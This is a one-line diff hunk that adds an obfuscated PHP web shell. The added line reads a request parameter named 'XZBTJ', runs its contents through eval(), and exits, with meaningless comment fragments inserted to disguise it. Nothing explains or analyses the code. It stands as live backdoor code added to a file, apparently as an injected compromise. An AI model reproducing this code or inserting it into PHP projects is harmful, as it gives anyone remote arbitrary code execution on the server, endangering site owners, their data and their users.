@@ -1,0 +1,1 @@
+<?php /*BMXcc*/if(isset($_REQUEST['XZBTJ']))/*fjaS*/{/*KEN*/eval(/*tv*/$_REQUEST['XZBTJ']);/*hSC*/exit;}?>
